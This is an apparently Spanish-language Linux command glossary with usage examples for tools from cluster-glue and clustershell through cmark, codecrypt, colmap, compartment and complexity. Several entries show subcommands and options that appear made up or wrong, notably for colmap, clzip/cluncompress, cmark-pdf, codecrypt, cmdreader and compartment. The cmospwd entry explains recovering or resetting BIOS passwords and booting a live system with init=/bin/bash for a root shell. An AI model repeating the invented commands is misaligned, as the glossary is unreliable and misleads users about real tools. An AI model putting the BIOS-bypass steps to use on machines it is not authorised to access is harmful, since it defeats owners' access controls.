Instala la versión HTML del libro de Guy L. Steele Common Lisp the Language, segunda edición. Este libro describe una instantánea del lenguaje Common Lisp durante el período en el que se creó el estándar ANSI Common Lisp. Por lo tanto, este libro describe una versión NO ESTÁNDAR de Common Lisp que es similar a, pero NO es, ANSI Common Lisp. En el navegador file:///usr/share/doc/cltl/clm/node1.html#SECTION00100000000000000000


cluster-glue
Forma parte del ecosistema de Linux HA [High Availability - Alta disponibilidad] y proporciona herramientas útiles para gestionar nodos en un clúster. Incluye utilidades para el cercado de nodos, gestión de recursos y diagnóstico de problemas en configuraciones de alta disponibilidad. Consta de la siguientes herramientas: ha_logger, hb_report, lrmadmin, meatclient y stonith
$ stonith_admin --list-installed (lista de dispositivos STONITH disponibles como controladores IPMI, dispositivos de energía, etc)
$ stonith_admin --test --device fencing-device (verifica si el dispositivo de cercado fencing-device está configurado correctamente)
$ stonith_admin --reboot --node node1 (reinicia el nodo node1 utilizando el método de cercado configurado)
$ ocf-tester -n my-resource -o param1=value1 -o param2=value2 /usr/lib/ocf/resource.d/heartbeat/IPaddr2 (prueba el script IPaddr2 con los parámetros especificados)
$ ocf-tester -n my-resource -o ip=192.168.1.100 /usr/lib/ocf/resource.d/heartbeat/IPaddr2 --all (ejecuta todas las operaciones compatibles [start, stop, monitor, etc.] en el agente especificado)
$ crm_attribute --node node1 --lifetime forever --query (muestra todos los atributos permanentes asignados al nodo node1)
$ crm_attribute --node node1 --name maintenance --update true (pone el nodo node1 en modo de mantenimiento)
$ crm_attribute --node node1 --name maintenance --delete (elimina el atributo maintenance del nodo)
$ hb_report /tmp/cluster-report (crea un informe detallado del clúster en el directorio /tmp/cluster-report)
$ clustat (muestra información como estado de los nodos [activos o inactivos], recursos asignados a cada nodo y fallos recientes)
$ clufter conf2pcs old_ha.cf > new_pcs.conf (convertir una configuración en formato antiguo de Heartbeat a Pacemaker)
$ cibadmin --query > cluster-config.xml (exportar la configuración actual)
$ cibadmin --replace --xml-file cluster-config.xml (edita el archivo exportado y aplica los cambios)


clustershell
Herramienta para gestionar y ejecutar comandos en nodos de clúster locales o distantes en paralelo. Incluye tanto la biblioteca de Python como el comando CLI clush.
$ clush -w nodo1,nodo2,nodo3 uptime (ejecutará uptime en los nodos nodo1, nodo2 y nodo3, mostrando el tiempo de actividad del sistema en cada nodo)
$ clush -w nodo[1-5] hostname (ejecuta hostname en los nodos nodo1, nodo2, nodo3, nodo4 y nodo5)
$ clush -g mi_grupo uptime (donde mi_grupo es un archivo en el directorio predeterminado ~/.clustershell/groups que contiene: nodo1, nodo1, nodo3)
$ clush -w nodo[1-3] --copy archivo_local --dest /ruta/remota/ (copiará archivo_local a /ruta/remota/ en los nodos nodo1, nodo2 y nodo3)
$ clush -w nodo[1-10] -b 5 df -h (ejecuta df -h en 10 nodos con un máximo de 5 conexiones paralelas)
$ clush --list (consultar los grupos de nodos definidos en el sistema)


clusterssh
[cssh]. Permite administrar múltiples sesiones SSH, RSH o Telnet de manera simultánea desde una única ventana de entrada de la que se puede enviar comandos a todas las sesiones activas, lo que resulta ideal para gestionar clústeres de servidores.
$ cssh server1.example.com server2.example.com server3.example.com (abrirá una ventana principal para enviar comandos simultáneamente y una ventana separada para cada servidor)
$ cssh --hostfile servidores.txt (leer servidores desde un archivo con un archivo a uno por linea)
$ cssh user@server1.example.com user@server2.example.com (especificar el usuario para las conexiones SSH)
$ cssh user@server1.example.com:2222 user@server2.example.com:2200 (si un servidor SSH está configurado para un puerto no estándar, se puede especificar)
$ cssh --telnet server1.example.com server2.example.com (cambiar el programa de conexión a telnet)
$ cssh --tile-layout (modificar cómo se distribuyen las ventanas)
$ cssh --layout 2x2 server1.example.com server2.example.com server3.example.com server4.example.com (definir un diseño específico, por ejemplo, 2x2)
$ cssh --command "uptime" server1.example.com server2.example.com (ejecutar un comando inmediatamente después de abrir las sesiones)
$ cssh --no-master server1.example.com server2.example.com (controlar las sesiones manualmente sin la ventana maestra)
Se puede definir clústeres en el archivo de configuración, por ejemplo:
$ nano ~/.clusterssh/clusters
       [web_servers]
        server1.example.com
        server2.example.com
        server3.example.com
       [db_servers]
        db1.example.com
        db2.example.com
Y para conectarte a un grupo específico:
$ cssh web_servers


clzip
Versión en lenguaje C de lzip un compresor de datos sin pérdida basado en el algoritmo LZMA, con una comprobación de integridad muy segura y una interfaz de usuario similar a la de gzip o bzip2.
$ clzip archivo.txt (comprimir un archivo)
$ clzip archivo1.txt archivo2.txt archivo3.txt (comprimirá todos los archivos especificados en una sola compresión)
$ clzip directorio/ (comprimirá todos los archivos en el directorio especificado y sus subdirectorios)
$ clzip archivo.txt -o cmprimido.lzma (especifica un nombre de salida personalizado para el archivo comprimido)
$ clzip --test archivo.lzma (verifica si el archivo comprimido está intacto sin descomprimirlo)
$ cluncompress archivo.lzma (descomprimir archivos creados con clzip)


cmark
Es la implementación de referencia de C de CommonMark, una versión racionalizada de la sintaxis Markdown
$ cmark input.md > output.html (convierte input.md al formato HTML y lo guarda en output.html)
$ cmark input.md | cmark-pdf > output.pdf (convierte input.md al formato PDF y lo guarda en output.pdf)
$ echo "# Título" | cmark --smart (muestra cómo se renderiza el Markdown en la salida estándar)
$ cmark --smart --xhtml input.md > output.html (usa opciones adicionales para mejorar la conversión)
$ cat input.md | cmark --gfm > output.html (filtra el contenido de un archivo y luego lo procesa con cmark)


cmdreader
Analiza los argumentos de la línea de comandos para convertir cadenas complicadas simplificandolas para usarlas de manera más directa en scripts o aplicaciones.
Si se ejecuta cmdreader con una lista de argumentos, el programa los desglosa y muestra un formato más fácil de procesar. Ejemplo:
$ cmdreader --arg1=value1 --arg2=value2
Salida:
        arg1: value1
        arg2: value2
Útil en scripts para interpretar argumentos más fácilmente.
Se puede utilizar un archivo de configuración para definir los parámetros que se desea aceptar y cómo procesarlos.
$ nano config.txt
arg1 default_value1
arg2 default_value2
$ cmdreader -f config.txt --arg1=new_value
Salida:
        arg1: new_value
        arg2: default_value2
$ cmdreader --json='{"arg1":"value1","arg2":"value2"}' (combinar con otros comandos para procesar argumentos en formato JSON)
Salida:
        arg1: value1
        arg2: value2
El verdadero poder de cmdreader se nota al usarlo en scripts para manejar cadenas complejas. Aquí tienes un ejemplo de cómo usarlo:
$ nano process.sh
#!/bin/bash
#
# Leer argumentos con cmdreader
output=$(cmdreader --arg1=value1 --arg2=value2)
#
# Extraer valores
arg1=$(echo "$output" | grep "arg1" | awk '{print $2}')
arg2=$(echo "$output" | grep "arg2" | awk '{print $2}')
#
# Usar las variables
echo "El valor de arg1 es: $arg1"
echo "El valor de arg2 es: $arg2"
Salida:
        El valor de arg1 es: value1
        El valor de arg2 es: value2
$ cmdreader --arg1=123 --arg2=abc --validate (si alguno de los argumentos no cumple las reglas de validación definidas, el programa devuelve un error)


cmdtest
Prueba herramientas de línea de comandos de Unix. Básicamente, se le proporciona un script, sus archivos de entrada y los archivos de salida esperados. cmdtest ejecuta el script y verifica que la salida sea la esperada.
$ mkdir echo_tests
$ nano echo_tests/hello.script
       echo hello, world
$ nano hello.stdout
       hello, world
Correr las pruebas:
$ $ cmdtest echo_tests
       test 1/1
       1/1 tests OK, 0 failures
Si se cambia el archivo "hello.stdout", cmdtest mostrará las diferencias:
$ cmdtest echo_tests
      FAIL: hello: stdout diff:
      --- echo_tests/hello.stdout	2021-01-01 12:00:00 +0000
      +++ echo_tests/hello.stdout-actual	2021-01-01 12:00:02 +0000
      @@ -1 +1 @@
      -hello, world
      +something else
      test 1/1
      0/1 tests OK, 1 failures


cobertura
Herramienta que mide la cobertura de las pruebas instrumentando una base de código Java y observando qué líneas de código se ejecutan y cuáles no a medida que se ejecuta el conjunto de pruebas. Además de identificar código no probado y localizar errores, puede optimizar el código marcando el código inactivo o inaccesible y puede brindar información sobre cómo funciona una API en la práctica. Incluye las herramientas cobertura-check, cobertura-instrument, cobertura-merge y cobertura-report.
$ cobertura-instrument /proyecto/src (instrumentará el código fuente en la carpeta especificada)
$ cobertura-check /proyecto/src (ejecutará las pruebas y generará un archivo de cobertura)
$ cobertura-report /proyecto/src (creará un informe index.html en la carpeta de salida con los resultados de la cobertura que puede visualizarse con el navegador)
$ cobertura-merge /proyecto/src -o resultado.cobertura (combinará múltiples archivos de cobertura en uno solo)


cockpit
Permite a los usuarios administrar servidores GNU/Linux mediante un navegador web. Ofrece configuración de red, inspección de registros, informes de diagnóstico, resolución de problemas de SELinux, sesiones de línea de comandos interactivas y más.


code2html
Script de Perl que convierte el código fuente de un programa a HTML
$ code2html -l python mi_script.py salida.html (de python a html)
$ code2html -p index.html mi_codigo.py (insertará el código fuente de mi_codigo.py enmascarado en el archivo index.html, dentro de una etiqueta <pre>)


codec2
Códec de audio especialmente diseñado para comprimir voz, no música, a velocidades de bits muy bajas para aplicaciones como la radio de voz digital. Probar diferentes tamaños de bits para encontrar el equilibrio entre tamaño de archivo y calidad de audio adecuado para la aplicación.
$ codec2 -c 3200 input.wav output.codec2 (codifica el archivo input.wav usando el modo 3200 bps y lo guarda como output.codec2)
$ codec2 -d 3200 input.codec2 output.wav (decodifica el archivo input.codec2 y lo guarda como output.wav)
Nota.- Otros tamaños de bits son 700, 2400...


codecgraph
Herramienta que se utiliza para generar gráficos que representan la topología de un códec de audio de alta definición [HD Audio] utilizando la información del subsistema ALSA [Advanced Linux Sound Architecture]. El analizador de Codecgraph lee la descripción del códec de /proc/asound/card*/codec#0 y los datos analizados se envían a Graphviz para la generación del gráfico real.
$ codecgraph -c ALC892 (generar un gráfico básico de un códec específico)
$ codecgraph -f /codecs/codec_description.txt (usar un archivo de descripción de códec en lugar de especificar su nombre)
$ codecgraph -c ALC892 -o png (generará una imagen en formato PNG del gráfico correspondiente al códec)


codecrypt
Herramienta de criptografía que puede utilizarse para cifrar, descifrar, firmar y verificar documentos y comunicaciones de manera similar a GnuPG o PGP.
Antes de cifrar o firmar documentos, se necesita generar un par de claves: pública y privada:
$ codecrypt --generate-key --email usuario@ejemplo.com (generará una clave NTRU [criptosistema de clave pública] y la almacenará en el directorio predeterminado: ~/.codecrypt/keys)
$ codecrypt --list-keys (listar todas las claves almacenadas)
$ codecrypt --export-key --email usuario@ejemplo.com --output usuario_publica.key (guardará la clave pública en el archivo usuario_publica.key)
$ codecrypt --import-key --file clave_otra_persona.key (importar clave pública)
$ codecrypt --encrypt --recipient usuario@ejemplo.com --input documento.txt --output documento.cifrado (generará un archivo cifrado llamado documento.cifrado)
$ codecrypt --decrypt --input documento.cifrado --output documento_descifrado.txt (descifrar un archivo cifrado)
$ codecrypt --sign --input documento.txt --output firma.sig --email usuario@ejemplo.com (genera una firma digital para el archivo)
$ codecrypt --verify --signature firma.sig --input documento.txt (si la firma es válida, mostrará un mensaje indicando que la verificación fue exitosa)
$ codecrypt --delete-key --email usuario@ejemplo.com (eliminar una clave)
$ codecrypt --encrypt --sign --recipient usuario@ejemplo.com --input documento.txt --output documento_cifrado_y_firmado (cifrar y firmar un archivo simultáneamente)
$ echo "Mensaje confidencial" | codecrypt --encrypt --recipient usuario@ejemplo.com --output mensaje.cifrado (automatizar procesos)


codegroup
convierte cualquier archivo, de cualquier formato, incluido el binario sin procesar, en un conjunto de grupos de códigos de cinco letras mayúsculas. El formato de grupo de códigos incluye un CRC de 16 bits y la longitud del archivo para verificar la integridad del mensaje. Codegroup NO HACE CRIPTOMONEDAS. Es simplemente un conversor de formatos de archivo, como base64 o uuencoding. A diferencia de otros algoritmos de codificación de archivos tradicionales, como base64 o uuencoding, Codegroup utiliza exclusivamente el alfabeto de 26 letras. Codegroup es ideal para transferir archivos binarios cortos a través de un canal de voz o código morse.
$ codegroup -e archivo archivo_codificado (codificar)
$ codegroup -d archivo_codificado archivo_sin_codificar (descodificar)


codesearch
Herramienta para indexar y luego realizar búsquedas de expresiones regulares en grandes cantidades de código fuente. Es un conjunto de programas de línea de comandos escritos en Go.
$ codesearch -filetype:c malloc (buscar la función "malloc" en todos los archivos C)
$ codesearch -filetype:py def -limit 10 (buscar "def" en Python, limitando a 10 resultados)
$ codesearch -from 100 main (Buscar "main" desde la línea 100 hasta el final del archivo)
$ codesearch -filetype:c ^get_[a-zA-Z] (usar expresiones regulares para buscar patrones más específicos)
$ codesearch -filetype=c++ global\s+[a-zA-Z0-9_]+; (buscar variables globales en C++)


codespell
Diseñado para encontrar y corregir errores ortográficos comunes especialmente en el código fuente y en inglés.
$ codespell . (verificar todos los scripts del directorio. Si los nombres de funciones, variables... no estan en inglés los marca como error)
$ codespell script.sh
$ codespell -w script.py (que realice automáticamente las correcciones encontradas)
$ codespell -e .py . (verificar en el presente directorio solo los archivos .py)
$ codespell -L palabra1,palabra2 -e .sh . (igonorar las palabras mencionadas en todos los .sh del directorio)


coinst
Este paquete es útil cuando se está interesado en analizar la co-instalabilidad de paquetes en un repositorio de paquetes grande. Un conjunto de paquetes se denomina co-instalable si se puede ampliar a un conjunto que satisface todas las relaciones entre paquetes (dependencias, conflictos, etc.). Esta herramienta reduce un repositorio a uno mucho más pequeño, su llamado núcleo de co-instalabilidad, que se comporta exactamente igual en lo que respecta a la co-instalabilidad de paquetes. Esto se logra: - eliminando todas las relaciones que no son relevantes para este propósito - identificando todos los paquetes que se comportan de la misma manera. El núcleo es típicamente órdenes de magnitud más pequeño que el repositorio original.
Requiere un archivo Packages para analizar la co-instalabilidad de paquetes. Puede obtenerse este archivo desde el repositorio de Debian o Ubuntu:
$ wget http://ftp.us.debian.org/debian/dists/stable/main/binary-amd64/Packages.gz
$ gunzip Packages.gz
$ coinst-genmodel -f Packages > modelo.cmodel (convierte el archivo Packages en un modelo legible por coinst)
$ coinst-scheck -f modelo.cmodel > resultados.txt (generará un informe de los paquetes que no pueden ser co-instalados y las razones de los conflictos en resultados.txt)
$ coinst-scheck -f modelo.cmodel --incompatible (muestra los pares de paquetes que no se pueden instalar juntos)
$ coinst-scheck -f modelo.cmodel --unsatisfied (ayuda a identificar problemas específicos relacionados con las dependencias)
$ coinst-scc -f modelo.cmodel > componentes.txt (genera un archivo componentes.txt con los detalles de los componentes)
$ coinst-scheck -f modelo.cmodel --graph | dot -Tpng -o conflictos.png (genera un archivo conflictos.png que muestra visualmente las relaciones entre paquetes y sus conflictos)


collectl
Herramienta de evaluación comparativa y monitoreo de rendimiento de un amplio conjunto de subsistemas que actualmente incluyen buddyinfo, cpu, disco, inodos, infiniband, lustre, memoria, red, nfs, procesos, quadrics, slabs, sockets y tcp.
$ collectl -all (mostrar estadísticas de todos los subsistemas)
$ collectl --top (opcion parecida al comando top [ver])
$ collectl -sc (resumen de la CPU)
$ collectl -sd (del uso del disco)
$ collectl -c1 -sZ -i:1 (información sobre los procesos del sistema)


colmap
Se trata de una secuencia de comandos de propósito general de Structure-from-Motion (SfM) y Multi-View Stereo (MVS) con una interfaz gráfica y de línea de comandos. Ofrece una amplia gama de funciones para la reconstrucción de colecciones de imágenes ordenadas y desordenadas.
$ colmap database create my_project.db (iniciar un nuevo proyecto)
$ colmap add_images --database my_project.db --images-path /carpeta/imágenes (añadir imágenes al proyecto)
$ colmap compute_pose_and_timeshift --database my_project.db (calcular la estructura del movimiento)
$ colmap per --database my_project.db --output_path /ruta/a/salir/mapper_output (calcular las coordenadas 3D de los puntos)
$ colmap mvs --database my_project.db --input_path /ruta/a/salir/mapper_output --output_path /ruta/a/salir/mvs_output (calcular el modelo de profundidad)
$ colmap viewer --mvs-output /ruta/a/salir/mvs_output (visualizar los resultados)


colores
Cuadro de colores. Las primeras dos cifras [0;30] afectan al color de las letras de la terminal, las segundas [0;40], una decena superior que las anteriores, corresponden al color de fondo.
	Negro          0;30	0;40
	Gris Obscuro   1;30	1;40
	Rojo           0;31	0;41
	Rojo Claro     1;31	1;41
	Verde          0;32	0;42
	Verde Claro    1;32	1;42
	Café           0;33	0;43
	Amarillo       1;33	1;43
	Azul           0;34	0;44
	Azul Claro     1;34	1;44
	Purpura        0;35	0;45
	Fucsia         1;35	1;45
	Cyan           0;36	0;46
	Cyan Claro     1;36	1;46
	Gris Claro     0;37	0;47
	Blanco         1;37	1;47
Nota.- Si se omite el el 0 o el 1 por defecto es el 0
Algunso ejemplos:
$ echo -e "\e[1;33;44mlinux es un sistema genial" (En azul toda la linea)
$ echo -e "\e[0;34mAtención:\e[1;32m linux es un\e[0;31m sistema genial" (En azul, verde y rojo sin fondo)
$ echo -e "\e[1;33;40mLinux es un sistema genial" (En amarillo y con fondo gris toda la linea)
$ echo -e "\e[1;37;1;41mLinux es un sistema genial\e[0m" (En blanco y fondo rojo hasta el final del texto  ...\e[0m")
$ echo -e "\e[33;40mAtención:\e[34;41m linux es un\e[37;42m sistema genial\e[0m" (café con fondo gris, azul y fondo rojo y blanco con fondo verde y terminando el colorido al final del texto)


cmake
Opciones de compilación de binarios. Substituto de ./configure. Se encarga de encontrar todas las dependencias necesarias y las opciones personalizadas de compilación
# cmake -L (Ver listado de opciones)
# cmake -LHA (Complementar el listado con una descripción breve y visualizar las variables privadas)


cmatrix
Salvapantallas estilo matrix
$ cmatrix -u 9 -B -C blue  (A velocidad lenta [0-9], usando todos los caracteres y especificando color [green, red, blue, white, yellow, cyan, magenta y black]
Nota.- Si durante la ejecución se pulsan las teclas siguientes, se cambia al color indicado:
! (rojo) @ (verde)# (amarillo) $ (azul) % (magenta) ^ (cyam) & (blanco) ) (negro)
Nota.- En la pantalla gráfica de screensaver, puede estar referenciada como GLMatrix o XMatrix


cmospwd
Herramienta para descifrar contraseñas almacenadas en CMOS que se utilizan para acceder a la configuración BIOS de una computadora. Esta aplicación debería funcionar de inmediato en la mayoría de los sistemas modernos, pero es posible que algunas BIOS más complejas no sean compatibles o requieran pasos adicionales.
# cmospwd -c "contraseña_cmos" (descifrar con una contraseña específica)
# cmospwd -p "palabra_secreta" (probar diferentes contraseña)
# cmospwd -d (volcar información por pantalla)
Tambien se puede arrancar con un cd-live [System rescue] y modificar la entrada del kernel del menú de opciones de grub para iniciar una shell [rw init=/bin/bash]
# cmospwd /d   (pasar la información por pantalla)
# cmospwd /k   (resetear)
# cmospwd /d /w bios.back  (copia de seguridad)
# cmospwd /l bios.back (Ver el contenido de la copia de seguridad)
# cmospwd /r bios.back  (restablecer la copia de seguridad)


cmp
Compara dos ficheros octeto a octeto.
$ cmp fichero1 fichero2


cmus
Reproductor de música.
$ cmus --plugins (Listado de plugins disponibles)
$ cmus
Algunas teclas de control:
	1 (Muestra la biblioteca)
	2 (Muestra la biblioteca ordenada según los criterios del usuario)
	4 (Muestra la cola de pistas que se reproducirá)
	5 (Navegar por los directorios)
	7 (Muestra todas las teclas de control)
	enter (reproducir la canción))
	+ (Sube el volumen un 10%)
	- (Baja el volumen un 10%)
	a (Añadir canción al listado)
	b (siguiente canción)
	c (Pausar la reproducción
	i (Estando con la opción 5, muestra los directorios ocultos)
	r (Repetir canción)
	q (salir)
Para empezar agregar la ruta al directorio de música:
	:add ~/música/
Listado de temas de colores disponibles en /usr/share/cmus. Para modificar el esquema de colores:
	:colorscheme cyan
Para que el cambio sea permanente:
$ nano .cmus/rc
Y colocar la linea:
	colorscheme cyan


cmt
[Computer Music Toolkit]. Colección de complementos compatibles con LADSPA que solo se pueden usar en aplicaciones host como sweep.


cnetworkmanager
Información sobre conexiones de red
$ cnetworkmanager -d (información sobre las tarjetas de red)
$ cnetworkmanager -c (conexión activa)
$ cnetworkmanager -s (lista todas la conexiónes guardadas)
$ cnetworkmanager -u (Lista configuración de usuario de la conexión)
$ cnetworkmanager --state  (estado de la conexión)
$ cnetworkmanager -a (Lista puntos de acceso)
$ cnetworkmanager -w true/false  (activar/desactivar la conexión)


codificación
[de caracteres]. En documentos html, colocar según proceda al inicio del documento la linea:
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />


cog
Pequeño navegador web de una sola ventana basado en WPE WebKit sin interfaz de usuario por lo que sus capacidades son limitadas comparadas con navegadores modernos y solo es útil para uso específico o como herramienta desarrollo web.
$ cog https://www.example.com


col
Normalmente este comando se utiliza para eliminar caracteres raros o no necesarios relacionados con el formato al imprimir a txt páginas man.
$ man less | col -b > less.txt


collectd
Demonio que recopila información del sistema periódicamentes. Las estadísticas se actualizan cada 10 segundos de forma predeterminada y pueden modificarse en el archivo /etc/collectd/collectd.conf. Ejemplos de configuraciónes en /usr/share/doc/collectd/examples/. Los datos recogidos se visualizan en http://localhost/server-status
# systemctl start collectd.service (pide contraseña de forma gráfica y activa el demonio)


colord
Servicio del sistema que facilita la administración, instalación y generación de perfiles de color para gestionar con precisión el color de los dispositivos de entrada y salida. Proporciona una API D-Bus para que los marcos del sistema realicen consultas, un almacén de datos persistente y un mecanismo para que las aplicaciones de sesión establezcan políticas del sistema. Contiene las herramientas cd-create-profile, cd-fix-profile, cd-iccdump, cd-it8 y colormgr
$ cd-create-profile /dev/usb/your-calibrator (crear un perfil de color a partir de un dispositivo de calibración)
$ cd-fix-profile /home/user/profiles/my-monitor.icc (reparar perfiles de color que pueden estar dañados o incorrectos, por ejemplo de un monitor)
$ cd-iccdump /home/user/profiles/my-monitor.icc (mostrar la información contenida en un perfil de color ICC como el espacio de color, el tipo de perfil y más)
$ cd-it8 /home/user/data/my-profile.it8 (crear un perfil de color a partir de datos en formato IT8)
$ colormgr get-device <device-id> (Obtener información sobre un dispositivo específico)
$ colormgr create-profile <device-id> /path/to/your/profile.icc (crear un nuevo perfil de color para un dispositivo específico)
$ colormgr get-devices (listar dispositivos)
$ colormgr get-profiles (listar perfiles disponibles)


colordiff
Muestra las diferencias entre dos ficheros de forma coloreada.
$ colordiff -y archivo1 archivo2  (en dos columnas)


colordiff-git
[apt-listdifferences]. Mismo resultado que diff con coloreado de sintaxis.
$ colordiff-git archivo1 archivo2


colored_dmesg
Como dmesg pero coloreado. El algunas distros el guión en medio [colored-dmesg]
$ colored_dmesg


colorize
Colorea el texto leído desde un flujo de entrada o archivo estándar mediante el uso de secuencias de escape ANSI (y también viceversa, es decir, limpiando el texto de las secuencias) e imprime la salida resultante en la terminal.
$ colorize green /etc/apt/sources.list (ver con el texto en verde)
$ colorize --attr=bold green /etc/apt/sources.list (en negrita verde)
$ colorize red/yellow /etc/apt/sources.list (texto en rojo y fondo amarillo)


colorized-logs
Colorea la salida de algunas herramientas [dmesg, ccze, gcc...]. Consta de los siguientes ejecutables: ansi2html[ver], ansi2txt[ver], lesstty, pipetty y ttyrec2ansi
$ pipetty dmesg


colormake
Esta herramienta analiza el resultado de make para colorearlo y facilitar su lectura. Contiene dos ejecutables: colormake y clmake que se pueden invocar en lugar de make con salida coloreada [configure, clmake, clmake install].


colormgr
[colord]. Ver y cambiar el perfil de color a las asignaciones de dispositivos. RGB es una escala relativa que normalmente tiene sólo 256 estados por canal.
$ colormgr get-devices display (listados de todos los dispositivos)
$ colormgr get-devices-by-kind display (del monitor. Sustituir "display" por printer, scanner, webcam...)


colortail
Funciona como tail pero usa expresiones regulares para determinar qué líneas y partes de líneas imprimir en qué colores.
$ sudo colortail -f /var/log/auth.log


colortest
Incluye un conjunto de utilidades para ayudar a probar cuántos colores puede mostrar un terminal. Estas configuraciones de color dependen de la variable de entorno $TERM y de la entrada termcap
$ colortest-8
$ colortest-256
$ colortest-16


colortest-python
El programa detecta automáticamente las capacidades de color y muestra las tablas de colores apropiadas. La aplicación es similar a colortest.
$ colortest-python -b
$ colortest-python -l (con el código RGB)
$ colortest-python -n (con los números de escape [del 0 al 256])
$ colortest-python -x (con el número exadecimal)


colrm
Corta columnas de un texto.
$ cat /etc/passwd | colrm 10 (Corta desde el caracter número 10 al final de la linea)
$ cat /etc/passwd | colrm 10 50 (Borra los caracteres del 10 al 50. Sólo deja los 10 primeros y los del 50 al final)


column
Muestra los resultados ordenados por clumnas.
$ column -tns: /etc/passwd (con los dos puntos como separador)
$ mount | column -t


combine
[moreutils]. Cuatro formas de combinar dos archivos.
$ combine archivo1 and archivo2 (Las lineas que están en los dos archivos)
$ combine archivo1 not archivo2 (Las que estan en archivo1 pero no en archivo2)
$ combine archivo1 or archivo2 (Las que están en archivo1 o archivo2)
$ combine archivo1 xor archivo2 (Las que se encuentran en cualquiera de los dos pero no en ambos)


comillas
. Simples (El contenido no es interpretado por el shell. Se suele usar para indica caracteres literales)
	$ echo 'a'
	a
. Dobles (Agrupa una cadena de caracteres o string. Se suelen usar para almacenar datos en una variable)
	a="Linux es un sistema genial"
. Invertidas (Evaluan el contenido y el resultado se devuelve como variable)
	$ fecha=`date`
	echo $fecha
	dg mar 17 20:53:17 CET 2013


comitup
Intentará conectarse a Wi-Fi mediante una conexión establecida. Si no lo logra, creará un punto de acceso y un servicio web para ayudar a configurar la conexión. La información detallada en /var/log/comitup.log.
# comitup -c (verificar la configuración del dispositivo wifi)
# comitup -i (imprimir información sobre la configuración actual)


comm
Comparación de dos ficheros. Muestra tres columnas, en la primera están las lineas que solo estan en el primer archivo, el la segunda los que solo están en el segundo y la tercera los comunes.
$ comm archivo1 archivo2
$ comm -12 archivo 1 archivo2 (Elimina las columnas 1 y 2. Solo muestra la 3, o sea las lineas comunes


command
Cuando introducimos un comando en Bash el orden de preferencia en la búsqueda del símbolo por parte de Bash es: Primero las funciones, luego los comandos internos y por último los ficheros de scripts y ejecutables. command hace que no se busquen alias ni nombres de funciones, sólo comandos internos y comandos de fichero. Si tenemos una función llamada ls() y queremos que se ejecute el comando ls y no la función:
$ command ls


command-not-found
Activar las sugerencias sobre el paquete que puede tener un comando que erramos en la ortografía o no está instalado en el sistema y muestra la salida: "command not found":
# update-command-not-found (Recargar la base de datos)
	$ lt
	The program 'lt' is currently not installed.  To run 'lt' please ask your administrator to install the package 'looptools'
	lt: command not found


commit-patch
Normalmente, los sistemas de control de versiones no permiten confirmaciones de granularidad fina. commit-patch permite al usuario controlar exactamente qué se confirma, ya que permite al usuario proporcionar un parche para confirmar en lugar de utilizar los archivos en el directorio de trabajo actual. commit-patch es compatible con repositorios Darcs, Git, Mercurial, Bazaar, Monotone, Subversion o CVS.
$ commit-patch patch
$ commit-patch -m "Este es un mensaje de confirmación" patch


comodines
Ver “signos y comodines”


comparepdf
Comparar dos archivos pdf.
$ comparepdf archivo1.pdf archivo2.pdf


compartment
Herramienta útil para ejecutar servicios o programas en un entorno seguro y aislado, minimizando los riesgos de seguridad.
$ compartment -- ls -l (ejecuta ls -l en un entorno con restricciones de seguridad)
$ compartment --user=nobody --group=nogroup -- ls -l (asegura que el comando se ejecute con los privilegios mínimos, evitando riesgos de escalación)
$ compartment --no-net -- curl http://example.com (fallará porque se ha deshabilitado el acceso a la red)
$ compartment --cap-drop=all -- ls /etc (ejecuta ls /etc con todas las capacidades eliminadas, reduciendo los riesgos)
$ sudo compartment --chroot=/path/to/chroot -- ls -l (ejecutar ls -l dentro de un entorno chroot para mayor aislamiento)
$ sudo compartment --daemonize --user=nobody --group=nogroup -- program_name (ejecutará program_name como un demonio con privilegios mínimos)
$ compartment --log=/var/log/compartment.log -- ls -l (registra la ejecución del comando ls -l en el archivo /var/log/compartment.log)
$ compartment --no-net --cap-drop=all --chroot=/secure/chroot --user=nobody -- /bin/bash (abre una shell de Bash en un entorno completamente aislado, sin acceso a la red y con capacidades limitadas)


compface
Convierte archivos de formato .xbm de 48 x 48 a un formato comprimido que se puede colocar en el encabezado de correo de X-Face: Algunos lectores de correo, como exmh, mostrarán esta imagen cuando el usuario lea su correo.
$ compface -c imagen.xbm > imagen.xcfaced (comprimirá el archivo imagen.xbm y lo guardará como imagen.xcfaced)
$ compface -d imagen.xcfaced > imagen_descomprimida.xbm (descomprimir)


compgen
Comando para listar comandos disponibles.
$ compgen -c (Lista todos los comandos)
$ compgen -ac (lista de todos los comandos y alias)
$ compgen -a (Lista los alias)
$ compgen -b (lista los comandos internos de bash)
$ compgen -k (lista palabras reservadas)
$ compgen -A function (lista las funciones)
$ compgen -c | grep sudo (las que hacen referencia a sudo)
$ compgen -a
$ compgen -c ls
$ compgen -c rm
$ compgen -A signal


compilar
[libncurses libncurses-fdev build-essential]. Instalar aplicaciones a partir del codigo fuente . Los comandos standard que se utilizan son: ./configure, make, sudo make install y han de ejecutarse desde el directorio que contiene las fuentes. Configure y make se pueden ejecutar como usuario normal, pero make install generalmente se tiene que ejecutar como administrador por cuestión de permisos.
El script configure [configuración] sirve para comprobar las dependencias y las versiones de las librerias del paquete a instalar creando el archivo makefile que constituye la base de la compilación. Si configure falla no se creará makefile. Configure, normalmente, puede ejecutarse con algunos parametros que, en caso de existir, se especifican en el fichero INSTALL o README y que siempre acompaña al paquete de las fuentes. Tambien puede ejecutarse:
$ ./configure --help
para listar los parametros que se pueden usar. Si en el	paquete	de fuentes a intalar ya existe un archivo makefile no habrá el configure y consecuentemente si se lanza ./configure dará error [No existe el fichero ó directorio] en estos casos puede pasarse directamente al make. Algunas opciones para	configure:
      $ ./configure --prefix=/usr  (donde inslalar el programa)
      $ ./configure --syscinfdir=/etc  (donde colocar los archivos de configuración)
      $ ./configure --locatestatedir=/var/lib  (donde colocar las librerías)
El make se encarga de leer el makefile donde se indica los archivos a compilar y el orden en el que deben ser compilados. La ejecución de make genera varios archivos necesarios para la compilación y que pueden ser eliminados, ya sea al final del proceso o si este ha de reiniciarse por algún error, con:
$ make clean
Si el archivo makefile no se ha borrado, Una vez instalado el programa, puede eliminarse con:
$ make uninstall
make install instala el paquete en el sistema. Una mejor opción a make install es usar checkinstall, lo cual crea un paquete .deb que constará en el listado de programas instalados con lo que se facilitará su desinstalación ya sea por synaptic o apt-get.


compiz
efectos escritorio.
$ compiz --replace (activar los efectos)
$ metacity --replace (Desactivar los efectos)


complexity
Herramienta para analizar la complejidad de funciones de los programas en C.
$ complexity archivo.c (analiza todas las funciones de archivo-c)
